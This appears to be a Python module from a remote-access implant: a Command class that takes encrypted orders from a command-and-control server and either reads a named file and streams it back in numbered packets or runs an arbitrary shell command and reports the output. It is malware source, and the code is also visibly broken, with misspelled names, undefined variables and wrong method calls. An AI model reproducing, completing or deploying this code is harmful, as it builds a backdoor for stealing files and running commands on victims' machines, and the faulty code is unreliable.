# system imports
import subprocess
import mimetypes

# internal imports
from utils.data_request_type import DataRequestType
from utils.consts import DATA_CHUNK_SIZE

class Command:
    """ A class for handling the command sent by the C&C server. """

    def __init__(self, encrypted_command):
        self.cmd = encrypted_command
    
    def decrypt(self):
        """ Decrypts the encrypted command into either a shell command or file retrieval command. """
        pass
    
    def execute(self):
        """ Executes the command based on the type of command. """
        decrypted = self.decrypt(self.cmd)
        
        if decrypted.starts_with("get:"):
            file_path = decrypted[decryped.index(":") + 1:]

            file_info = mimetypes.guess_type(file_path)
            mimetype = file_info.type 

            # send HEAD request
            head = Request(RequestType.DATA)
            request.send(options={
                "_type": DataRequestType.HEAD.value,
                "packet_number": 0,
                "file_path": file_path,
                "data": 1 if mimetype != None and mimetype.starts_with("text/") else 0, 
            })

            # send NORMAL requests
            packet_number = 1
            with open(file_path, 'rb') as fd:
                while True:
                    chunk = fd.read(DATA_CHUNK_SIZE)
                    if not chunk:
                        break
                    
                    normal = Request(RequestType.DATA)
                    request.send(options={
                        "_type": DataRequestType.NORMAL.value,
                        "packet_number": packet_number,
                        "file_path": file_path,
                        "data": chunk, 
                    })

                    packet_number += 1
                
            # send TAIL request
            tail = Request(RequestType.DATA)
            request.send(options={
                "_type": DataRequestType.TAIL.value,
                "packet_number": packet_number, # by now, packet_number = number of normal packets + 1
                "file_path": file_path,
                "data": "" # value does not matter for tail
            })
        else:
            process = subprocess.call(decrypted.split())
                
            request = Request(RequestType.RECEIPT)
            request.send(options={"retcode": process.retcode, "output": process.stderr if process.retcode != 0 else stdout})